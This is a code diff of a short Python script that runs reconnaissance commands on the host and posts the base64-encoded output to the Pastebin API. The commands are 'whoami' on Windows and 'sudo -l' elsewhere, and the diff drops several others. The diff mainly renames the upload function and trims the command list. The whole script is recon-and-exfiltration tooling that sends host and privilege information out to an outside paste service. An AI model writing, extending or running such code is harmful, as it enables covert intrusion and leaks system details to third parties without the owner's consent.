@@ -1,6 +1,9 @@
-import subprocess, requests, base64, os
+import subprocess
+import requests
+import base64
+import os
 
-def upload(data):
+def upload_pastebin(data):
     
     url = 'https://pastebin.com/api/api_post.php'
     api_data = {
@@ -27,19 +30,15 @@ def run_cmd(cmd):
             results.append(output.decode())
 
     results = "\n".join(results)
-    upload(base64.b64encode(results.encode()))
+    upload_pastebin(base64.b64encode(results.encode()))
 
 
 def main():
     cmd = []
     if os.name == "nt":
-        cmd.append("systeminfo")
         cmd.append("whoami")
-        cmd.append("whoami /priv")
     else:
-        cmd.append("uname -a")
         cmd.append("sudo -l")
-        cmd.append("hostname")
     run_cmd(cmd)
 
 main()
